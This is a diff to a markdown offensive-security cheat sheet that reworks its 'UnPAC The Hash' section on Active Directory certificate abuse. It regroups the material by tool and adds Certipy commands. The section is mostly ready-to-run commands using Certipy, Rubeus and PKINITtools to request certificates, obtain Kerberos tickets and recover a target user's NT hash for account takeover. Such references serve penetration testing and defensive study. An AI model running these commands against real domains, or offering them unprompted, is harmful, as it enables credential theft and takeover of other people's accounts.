@@ -167,22 +167,30 @@ There is still a way to use the certificate to takeover the account.
 
 Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User via its certificate.
 
-* Windows
+* [ly4k/Certipy](https://github.com/ly4k/Certipy)
 
-    ```ps1
-    # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
-    Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
-    ```
+  ```ps1
+  export KRB5CCNAME=/pwd/to/user.ccache
+  proxychains certipy req -username "user@domain.lab" -ca "domain-DC-CA" -target "dc1.domain.lab" -template User -k -no-pass -dns-tcp -ns 10.10.10.10 -dc-ip 10.10.10.10
+  proxychains certipy auth -pfx 'user.pfx' -dc-ip 10.10.10.10 -username user -domain domain.lab
+  ```
 
-* Linux
+* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
 
-    ```ps1
-    # Obtain a TGT by validating a PKINIT pre-authentication
-    $ gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
-    
-    # Use the session key to recover the NT hash
-    $ export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
-    ```
+  ```ps1
+  # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
+  Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+  ```
+
+* [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)
+
+  ```ps1
+  # Obtain a TGT by validating a PKINIT pre-authentication
+  gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+  
+  # Use the session key to recover the NT hash
+  export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
+  ```
 
 ## Common Error Messages
 
